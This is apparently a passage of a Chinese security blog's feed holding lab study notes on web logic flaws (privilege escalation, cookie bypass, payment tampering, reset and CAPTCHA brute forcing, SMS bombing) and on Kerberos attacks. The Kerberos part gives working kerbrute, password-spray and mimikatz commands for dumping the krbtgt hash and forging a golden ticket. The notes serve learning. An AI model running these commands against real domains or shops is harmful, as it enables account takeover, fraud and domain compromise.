                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/cc5ad2c775c548ad2e666257f2dda0955ffdfb06.png@831w_122h_progressive.webp"
                      alt="img"
                ></p>
<ol start="4">
<li><p>查看源代码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/5b160682c3c05c4d5a892c2606e3871c474303a2.png@810w_227h_progressive.webp"
                      alt="img"
                ></p>
</li>
</ol>
<h2 id="JAVA语言方面"><a href="#JAVA语言方面" class="headerlink" title="JAVA语言方面"></a>JAVA语言方面</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221009143751313.png"
                      alt="image-20221009143751313"
                ></p>
]]></content>
  </entry>
  <entry>
    <title>逻辑越权</title>
    <url>/2023/03/08/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/</url>
    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117170059743.png"
                      alt=" "
                ></p>
<p>一般来说是更换了某个id之类的身份标识，从而使A账号获取（修改，删除等）B账号数据。</p>
<p>使用低权限身份账号，发送高权限账号才能有点请求，获得高权限的操作。</p>
<p>通过删除请求中的认证信息后重放该请求，依旧可以访问或者完成操作。</p>
<h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><h6 id="第一项就是信息收集"><a href="#第一项就是信息收集" class="headerlink" title="第一项就是信息收集"></a>第一项就是信息收集</h6><p>一般一个网站注册时输入用户名都会禁止用户名的重复使用，可以通过这个机制判断存在的用户名，或者再一些个人主页的介绍中也会显示该用户的用户名等一些信息 </p>
<h6 id="pikachu靶场水平越权演示（添加用户）"><a href="#pikachu靶场水平越权演示（添加用户）" class="headerlink" title="pikachu靶场水平越权演示（添加用户）"></a>pikachu靶场水平越权演示（添加用户）</h6><p>先登入自己或者已知的账号，用抓包工具抓个包</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117173104587.png"
                      alt="image-20221117173104587"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117173229898.png"
                      alt="image-20221117173229898"
                ></p>
<p>通过前面的信息收集获取别的账号用户名，更改username数据包信息为lucy，放包</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117173612943.png"
                      alt="image-20221117173612943"
                ></p>
<p>发现直接登入进去，信息得以获取</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117173357607.png"
                      alt="image-20221117173357607"
                ></p>
<h6 id="pikachu靶场垂直越权漏洞演示"><a href="#pikachu靶场垂直越权漏洞演示" class="headerlink" title="pikachu靶场垂直越权漏洞演示"></a>pikachu靶场垂直越权漏洞演示</h6><p>首先来到管理员后台，发现具有删除操作以及用户添加权限</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117175438679.png"
                      alt="image-20221117175438679"
                ></p>
<p>添加账号，并通过抓包工具抓取数据包，存放数据包备用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117180719404.png"
                      alt="image-20221117180719404"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117180735730.png"
                      alt="image-20221117180735730"
                ></p>
<p>接下来来到普通用户界面，发现只有查看权限</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117180014736.png"
                      alt="image-20221117180014736"
                ></p>
<p>抓取该用户的数据包，并且复制该用户的cookie信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117180904785.png"
                      alt="image-20221117180904785"
                ></p>
<p>将该cookie替换至刚才保存的管理员数据包中</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117180934389.png"
                      alt="image-20221117180934389"
                ></p>
<p>放包，发现刚才添加的用户，以普通用户的形式被添加</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117181007984.png"
                      alt="image-20221117181007984"
                ></p>
<p>等等！好像有点不对劲：这个步骤是先要利用管理员的数据包，但是你都具有管理员权限了，为什么还用普通用户添加账号，这根本就不符合逻辑，显得有些鸡肋。</p>
<p>那该怎么利用这个漏洞：主要是研究怎么获取管理员数据包</p>
<p>1.普通用户如果在前端具有操作界面（就是说显示着可以添加用户但是点之后会给你提示说没有权限的弹窗之类的）可以抓取数据包</p>
<p>2.通过网站源码本地搭建，自己模拟抓取</p>
<p>3.盲猜</p>
<h6 id="墨者靶场题目演示（水平越权）："><a href="#墨者靶场题目演示（水平越权）：" class="headerlink" title="墨者靶场题目演示（水平越权）："></a>墨者靶场题目演示（水平越权）：</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117201422846.png"
                      alt="image-20221117201422846"
                ></p>
<p>登入靶场，目标是获取马春生的信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117201456774.png"
                      alt="image-20221117201456774"
                ></p>
<p>登入测试账号test，抓包，发现uid&#x3D;test，如果将其改成马春生的用户名会不会登入进去？</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117201819559.png"
                      alt="image-20221117201819559"
                ></p>
<p>第二个数据包，发现有个card_id可能是用户的编号</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117202202381.png"
                      alt="image-20221117202202381"
                ></p>
<p>访问card_id，可以得到该账户的信息，包括密码等</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117202646702.png"
                      alt="image-20221117202646702"
                ></p>
<p>改变card_id值发现可以访问别的用户的信息，一个一个试断然不可能这时候就需要借用工具来解决</p>
<p>将数据包发送值intruder模块</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117202840353.png"
                      alt="image-20221117202840353"
                ></p>
<p>将card_id的值的最后两位作为替换值，范围为00-99，通过爆破可获得其他用户的数据信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117203032419.png"
                      alt="image-20221117203032419"
                ></p>
<p>那该怎么找到马春生的账号card_id呢？</p>
<p>返回网页登录页，仔细查看马春生的图像，f12查看发现图片的名字跟card_id有关联，说明既有可能是马春生的card_id</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117203311191.png"
                      alt="image-20221117203311191"
                ></p>
<p>返回数据包，查看该值的数据，可能就是马春生的信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117203421886.png"
                      alt="image-20221117203421886"
                ></p>
<p>返回包查看账号密码，登入验证</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117203534056.png"
                      alt="image-20221117203534056"
                ></p>
<p>密码md5加密，解密一下，得到密码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117203615549.png"
                      alt="image-20221117203615549"
                ></p>
<p>登入账号，结束！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117203653213.png"
                      alt="image-20221117203653213"
                ></p>
<h6 id="漏洞产生原理"><a href="#漏洞产生原理" class="headerlink" title="漏洞产生原理"></a>漏洞产生原理</h6><p>前端安全造成：界面</p>
<p>判断用户等级之后，代码界面部分进行可选显示</p>
<p>后端安全造成：数据库</p>
<p>user表（管理员和普通用户同表）：id，username，password，usertype</p>
<p>​                                                               1     admin            123456              1</p>
<p>​                                                               2     xiaodi            555555               2</p>
<p>登陆用户admin或小迪时，怎么判断是什么级别的用户？</p>
<p>通过usertype值来判断</p>
<p>如果在访问网站数据包中有传输用户的编号、用户组编号或者类型编号的时候，那么尝试对这个值进行修改，就是测试越权漏洞的基本方法。</p>
<h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><h3 id="登录应用功能点安全问题"><a href="#登录应用功能点安全问题" class="headerlink" title="登录应用功能点安全问题"></a>登录应用功能点安全问题</h3><p>1.直接通过爆破绕过</p>
<p>2.cookie脆弱性</p>
<p>分析以下代码发现，它只对cookie中user的值是否为空进行验证，只要保证user的值不为空，随便一个数据都可以绕过验证</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118154542565.png"
                      alt="image-20221118154542565"
                ></p>
<p>操作只要把cookie的值，改为user&#x3D;a或者任意一个数即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118154848591.png"
                      alt="image-20221118154848591"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118154922813.png"
                      alt="image-20221118154922813"
                ></p>
<p>放包，进入后台</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118155003846.png"
                      alt="image-20221118155003846"
                ></p>
<p>以上是白盒测试结果，在黑盒环境（实战）中，如何确定？</p>
<p>在实战中一般看数据包的参数，一般看cookie值，但是十分的困难</p>
<h3 id="数据篡改安全问题"><a href="#数据篡改安全问题" class="headerlink" title="数据篡改安全问题"></a>数据篡改安全问题</h3><h4 id="支付篡改"><a href="#支付篡改" class="headerlink" title="支付篡改"></a>支付篡改</h4><p><a class="link"   href="https://www.secpulse.com/archives/67080.html" >https://www.secpulse.com/archives/67080.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h6 id="商城支付漏洞"><a href="#商城支付漏洞" class="headerlink" title="商城支付漏洞"></a>商城支付漏洞</h6><p>进入商城程序</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118160616031.png"
                      alt="image-20221118160616031"
                ></p>
<p>点击购买，进行抓包</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118160725696.png"
                      alt="image-20221118160725696"
                ></p>
<p>发现数据包中有数量参数，但是没有发现金额数据</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118160751796.png"
                      alt="image-20221118160751796"
                ></p>
<p>尝试将数量改成负数，会不会价格也成负数？</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118161056513.png"
                      alt="image-20221118161056513"
                ></p>
<p>果然！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118161118507.png"
                      alt="image-20221118161118507"
                ></p>
<h6 id="订单情况分析"><a href="#订单情况分析" class="headerlink" title="订单情况分析"></a>订单情况分析</h6><p>更改订单编号，以1价格买2东西</p>
<p>第一个先买1件商品，生成订单</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118161936394.png"
                      alt="image-20221118161936394"
                ></p>
<p>点击提交订单，抓取数据包，生成订单编号</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118162057115.png"
                      alt="image-20221118162057115"
                ></p>
<p>生成一个新的订单，这次买10件，提交订单</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118161508718.png"
                      alt="image-20221118161508718"
                ></p>
<p>提交订单，抓取数据包，得到本单的订单号</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118161639771.png"
                      alt="image-20221118161639771"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118161804721.png"
                      alt="image-20221118161804721"
                ></p>
<p>将前一个只买一件的订单的订单号复制到该数据包中，放包</p>
<p>得到只需1件的价格就能买10件的支付订单</p>
<h6 id="修改价格以及商品的漏洞演示"><a href="#修改价格以及商品的漏洞演示" class="headerlink" title="修改价格以及商品的漏洞演示"></a>修改价格以及商品的漏洞演示</h6><p>进入网页</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118163016002.png"
                      alt="image-20221118163016002"
                ></p>
<p>购买两个，抓取数据包，发现数量参数和价格</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118163312968.png"
                      alt="image-20221118163312968"
                ></p>
<p>修改价格和数量，放包</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118163408592.png"
                      alt="image-20221118163408592"
                ></p>
<p>也可以修改商品的id来修改商品种类</p>
<p>数据包，商品的名字参数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118163541329.png"
                      alt="image-20221118163541329"
                ></p>
<p>换一款商品，抓取数据包，复制name和id参数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118163815190.png"
                      alt="image-20221118163815190"
                ></p>
<p>将复制的name和id参数替换到便宜的商品的数据包中提交，放包，成功！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118164306598.png"
                      alt="image-20221118164306598"
                ></p>
<h6 id="支付方式"><a href="#支付方式" class="headerlink" title="支付方式"></a>支付方式</h6><p>可以更改支付接口，也就是改支付金额的提交账户，可以实现将钱支付到自己的账号上</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118165142012.png"
                      alt="image-20221118165142012"
                ></p>
<p>简单来说就是：抓包-改包-支付-钱打到自己的账户上-购买成功</p>
<h2 id="验证和找回"><a href="#验证和找回" class="headerlink" title="验证和找回"></a>验证和找回</h2><h4 id="找回重置机制"><a href="#找回重置机制" class="headerlink" title="找回重置机制"></a>找回重置机制</h4><p>客户端回显、response状态值，验证码爆破，找回流程绕过</p>
<h6 id="1-找回流程绕过靶场演示"><a href="#1-找回流程绕过靶场演示" class="headerlink" title="1.找回流程绕过靶场演示"></a>1.找回流程绕过靶场演示</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221119132500738.png"
                      alt="image-20221119132500738"
                ></p>
<p>进入靶场</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221119132537710.png"
                      alt="image-20221119132537710"
                ></p>
<p>直接用自己的手机号获取验证码，然后直接改成别人的手机号就行，抓包，数据包里面改</p>
<p>2.状态码修改漏洞：可以修改状态值，但是得看验证码的校准是在哪里验证的，服务器就不行，本地就可以抓取返回包修改返回状态值为成功即可</p>
<p>3.就是可以通过修改数据包跳过验证页面，直接修改的漏洞</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221119142436036.png"
                      alt="image-20221119142436036"
                ></p>
<p>4.爆破测试实例</p>
<p>把验证码参数作为爆破点执行爆破</p>
<p>5.app短信轰炸接口调用实例</p>
<p> 利用各种app的短信验证码发送接口，利用抓包工具进行抓取，并将这些接口数据包整合以一定的间隔时间触发发送，实现短信轰炸</p>
<h2 id="验证安全"><a href="#验证安全" class="headerlink" title="验证安全"></a>验证安全</h2><h3 id="token"><a href="#token" class="headerlink" title="token"></a>token</h3><h3 id="验证码安全"><a href="#验证码安全" class="headerlink" title="验证码安全"></a>验证码安全</h3><p>分类：图片、手机或者邮箱、语音、视频、操作</p>
<h6 id="验证码的识别插件以及工具的操作演示"><a href="#验证码的识别插件以及工具的操作演示" class="headerlink" title="验证码的识别插件以及工具的操作演示"></a>验证码的识别插件以及工具的操作演示</h6><p>就是识别图片验证码插件，很简单不写了</p>
<h6 id="验证码绕过"><a href="#验证码绕过" class="headerlink" title="验证码绕过"></a>验证码绕过</h6><p>服务器验证：</p>
<p>先随便输入一个正确的验证码和错误的账号，发现提示账号密码错误</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121144611245.png"
                      alt="image-20221121144611245"
                ></p>
<p>输入错误的验证码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121144645374.png"
                      alt="image-20221121144645374"
                ></p>
<p>抓包，试验一下改账号密码验证码不变重放数据包，是否报验证码错误，发现不报验证码错误，说明可以直接爆破</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121144916679.png"
                      alt="image-20221121144916679"
                ></p>
<p>将数据包发送到爆破模块，登陆成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121145109682.png"
                      alt="image-20221121145109682"
                ></p>
<p>客户端验证：</p>
<p>使劲点登陆，出现该弹窗，说明是客户端验证，源代码具有验证代码（前端验证）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121145353378.png"
                      alt="image-20221121145353378"
                ></p>
<p>爆破方法一样，就不说了</p>
<p>token绕过：</p>
<p>1.通过查看多个token值，推出规律，但是几乎不可能</p>
<p>2.替换法，将返回的验证数据包中的token值替换到请求包中即可，现在主要是要解决批量提交的问题</p>
<p>操作步骤：</p>
<p>抓取数据包</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121152520703.png"
                      alt="image-20221121152520703"
                ></p>
<p>将数据包发送至爆破模块，并设置爆破项，密码及token</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121152720271.png"
                      alt="image-20221121152720271"
                ></p>
<p>更改模式</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121152813967.png"
                      alt="image-20221121152813967"
                ></p>
<p>进入payloads，设置密码字典，和token</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121152913522.png"
                      alt="image-20221121152913522"
                ></p>
<p> 重点来了，设置token！！！</p>
<p>进入options</p>
<p>设置线程为1</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121153042170.png"
                      alt="image-20221121153042170"
                ></p>
<p>往下翻，找到redirections，设置为always</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121153231388.png"
                      alt="image-20221121153231388"
                ></p>
<p>再找到Grep-Extract，点击Add，找到token值选中，点击ok</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121153554177.png"
                      alt="image-20221121153554177"
                ></p>
<p>回到payloads，设置2参数也就是token参数，设置为Recursive grep</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121153704611.png"
                      alt="image-20221121153704611"
                ></p>
<p>开始爆破，即可！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121154019160.png"
                      alt="image-20221121154019160"
                ></p>
<p>这个操作主要就是把上一次的返回token，作为下一次的请求token替换，提交，即可绕过</p>
]]></content>
  </entry>
  <entry>
    <title>Kerberos攻击</title>
    <url>/2023/04/14/Kerberos%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230404104911790.png"
                      alt="image-20230404104911790"
                ></p>
<h2 id="AS-REQ-amp-AS-REP阶段攻击"><a href="#AS-REQ-amp-AS-REP阶段攻击" class="headerlink" title="AS_REQ&amp;AS_REP阶段攻击"></a>AS_REQ&amp;AS_REP阶段攻击</h2><h3 id="域内用户枚举"><a href="#域内用户枚举" class="headerlink" title="域内用户枚举"></a>域内用户枚举</h3><p>kerberos是一种认证协议，在第一阶段AS_REQ中当用户不存在时，返回包提示错误，用户存在时，密码正确，密码错误时返回包都不一样</p>
<p>利用这一点就可以枚举出域内用户</p>
<p>三种状态的错误代码分别为：</p>
<p>KRB5DC_ERR_PREAUTH_REQUIRED           需要额外的预认证（用户存在）<br>KRB5DC_ERR_CLIENT_REVOKED                  客户端凭证已被吊销（禁用 ）<br>KRB5DC_ERR_C_PRINCIPAL_UNKNOWN    在Kerberos数据库中找不到客户端（不存在）</p>
<h6 id="枚举工具的使用"><a href="#枚举工具的使用" class="headerlink" title="枚举工具的使用"></a>枚举工具的使用</h6><p>kerbrute</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe userenum --dc 域控ip -d 域名 用户名字典.txt</span><br><span class="line">kerbrute_windows_amd64.exe userenum --dc 192.168.10.2 -d test.lab users.txt</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230404112100259.png"
                      alt="image-20230404112100259"
                ></p>
<h3 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h3><p>在常规的爆破中，一般都是用很多密码取碰撞一个账户，很容易导致账号被锁定，密码喷洒时用一个密码去碰撞很多的账号，这个能有效避免账号被锁定</p>
<h6 id="喷撒原理"><a href="#喷撒原理" class="headerlink" title="喷撒原理"></a>喷撒原理</h6><p>就是在确认用户存在过后就会发送一个AS_REQ请求去，密码正确就会返回一个AS_REP，否则返回</p>
<p>KRB5KDC_ERP_PREAUTH_FAILED</p>
<ol>
<li>kerbrute工具</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe passwordspray --dc 192.168.10.2 -d test.lab users.txt yuwin7.com（密码）</span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li><p>ADPwdSpray.py</p>
<p>可以利用hash值进行喷洒</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">针对明文进行喷洒</span><br><span class="line">python2 ADPwdSpray.py 192.168.10.2 test.lab users.txt clearpassword 123.com(密码) tcp</span><br><span class="line"> </span><br><span class="line">针对哈希进行喷洒</span><br><span class="line">python2 ADPwdSpray.py 192.168.10.2 test.lab users.txt ntlmhash afffeba176210fad4628f0524bfe1942 udp</span><br></pre></td></tr></table></figure></div>


</li>
<li><p>DomainPasswordSpray.ps1</p>
</li>
</ol>
<p>该工具需要在powershell环境中使用，powershell4.0不可用</p>
<p>这个工具是利用LDAP从域中导出用户列表，然后去掉被锁定的用户，再用固定密码进行密码喷洒</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">自动从域中导出用户列表</span><br><span class="line">powershell -exec bypass</span><br><span class="line">Import-Module .\DomainPasswordSpray.ps1</span><br><span class="line">Invoke-DomainPasswordSpray -Password 密码</span><br><span class="line">指定用户列表，指定单个密码进行爆破</span><br><span class="line">Invoke-DomainPasswordSpray -Userlist users.txt -Domain test.lab -password yuwin2012.com（密码）</span><br><span class="line">指定用户、密码列表进行爆破，输出到特定文件中</span><br><span class="line"></span><br><span class="line">依次使用密码对账号进行匹配，简称喷洒</span><br><span class="line">Invoke-DomainPasswordSpray -Userlist users.txt -Domain test.lab -PasswordList pass.txt</span><br></pre></td></tr></table></figure></div>

<h3 id="AS-REP-Roasting攻击"><a href="#AS-REP-Roasting攻击" class="headerlink" title="AS_REP Roasting攻击"></a>AS_REP Roasting攻击</h3><p>AS_REP Roasting攻击是一种对用户账号进行离线爆破的攻击方式。</p>
<p>比较局限，需要勾选“不需要kerberos预身份验证“，默认不勾选</p>
<p>这个选项是第一步（AS_REQ&amp;AS_REP），主要是防止密码脱机爆破</p>
<p>如果关闭之后</p>
<p>就可以使域控不会作任何反应就会将TGT票据和加密hash的session Key 返回，就可以离线破解得到明文密码</p>
<h3 id="黄金票据攻击"><a href="#黄金票据攻击" class="headerlink" title="黄金票据攻击"></a>黄金票据攻击</h3><p>在Keerberos认证协议中，所有用户的票据都是由krbtgt的NTLM哈希值加密的来的</p>
<p>只要获取krbtgt的值就可以伪造任意用户的票据</p>
<p>这种方式就叫做黄金票据攻击</p>
<p>需要 域名、域sid、krbtgt哈希值、伪造的用户，这些信息（域控）</p>
<p><code>whoami /user</code>获取域的sid值</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405165843784.png"
                      alt="image-20230405165843784"
                ></p>
<p><code>net config workstation</code>查看所处域</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405165952637.png"
                      alt="image-20230405165952637"
                ></p>
<p>获取krbtgt用户的hash</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz</span><br><span class="line">privilege::debug   提权</span><br><span class="line">lsadump::lsa /patch   获取krbtgt用户的hash，域的sid值</span><br><span class="line">lsadum::lsa /patch /user:krbtgt</span><br></pre></td></tr></table></figure></div>

<p>不知道为什么krbtgt的NTLM值读不出来</p>
<p>3240a50b789addc29388d03988e89209</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405170743855.png"
                      alt="image-20230405170743855"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405113131030.png"
                      alt="image-20230405113131030"
                ></p>
<p>然后利用得到的hash值，利用mimikatz生成黄金票据并导入（在其他域内机子中输入）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">清除票据</span><br><span class="line">Kerberos::purge</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kerberos::golden /admin:Administrator /domain:hack-my.com /sid:S-1-5-21-3694414171-540705576-2292004015 /krbtgt:3240a50b789addc29388d03988e89209 /ticket:ticket.kirbi</span><br><span class="line"></span><br><span class="line">kerberos::golden /admin:Administrator /domain:hack-my.com /sid:域控sid /krbtgt:NTLM值（3240a50b789addc29388d03988e89209） /ticket:ticket.kirbi</span><br><span class="line"></span><br><span class="line">kerberos::ptt ticket.kirbi</span><br><span class="line"></span><br><span class="line">连接共享</span><br><span class="line">dir \\ip\c$</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406141213924.png"
                      alt="image-20230406141213924"
                ></p>
<p>拒绝访问，不知道为啥</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406141242727.png"
